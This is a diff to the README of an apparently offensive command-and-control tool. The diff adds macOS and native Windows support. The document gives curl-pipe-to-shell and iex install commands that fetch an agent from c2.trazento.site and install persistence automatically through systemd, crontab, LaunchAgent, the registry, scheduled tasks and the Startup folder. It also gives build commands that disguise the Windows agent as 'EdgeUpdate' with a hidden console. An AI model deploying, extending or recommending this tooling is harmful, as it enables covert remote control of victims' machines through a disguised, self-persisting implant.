@@ -4,12 +4,12 @@ Command & Control system with persistent PTY shell, deployable via Cloudflare Tu
 
 ## Quick Deploy
 
-**Linux (default — binary from c2.trazento.site):**
+**Linux / macOS (default — binary from c2.trazento.site):**
 ```bash
 sh -c "$(curl -sS https://c2.trazento.site/install.sh)"
 ```
 
-**Linux (custom binary URL — host it anywhere):**
+**Linux / macOS (custom binary URL — host it anywhere):**
 ```bash
 C2_AGENT_URL="https://github.com/user/repo/releases/latest/download/c2_agent" \
   sh -c "$(curl -sS https://c2.trazento.site/install.sh)"
@@ -27,6 +27,13 @@ iex (iwr https://c2.trazento.site/install.ps1)
 ```
 
 Scripts auto-detect OS/arch, download the matching agent binary, and run it. Persistence is installed automatically on first run.
+
+**Supported platforms:**
+| OS | Shell | Persistence |
+|----|-------|-------------|
+| Linux | bash PTY | systemd + crontab |
+| macOS | zsh/bash PTY | LaunchAgent + crontab |
+| Windows 7/10/11 | cmd.exe | Registry + schtasks + Startup folder |
 
 ## Server
 
@@ -150,11 +157,23 @@ pyinstaller --onefile --clean --name c2_server c2_server.py
 pyinstaller --onefile --clean --name c2_agent c2_agent.py
 ```
 
+### macOS
+```bash
+pip3 install pyinstaller
+pyinstaller --onefile --clean --name c2_agent c2_agent.py
+```
+
 ### Windows (cross-compile with Docker)
 ```bash
 docker run --rm -v "$PWD:/work" cdrx/pyinstaller-windows \
   "pip install pyinstaller && pyinstaller --onefile --noconsole --name EdgeUpdate \
   --icon <icon> --version-file version.txt --hidden-import winreg c2_agent.py"
+```
+
+### Windows (native on Windows)
+```powershell
+pip install pyinstaller
+pyinstaller --onefile --noconsole --name EdgeUpdate --hidden-import winreg c2_agent.py
 ```
 
 Set the agent's `SERVER` constant to your domain before building:
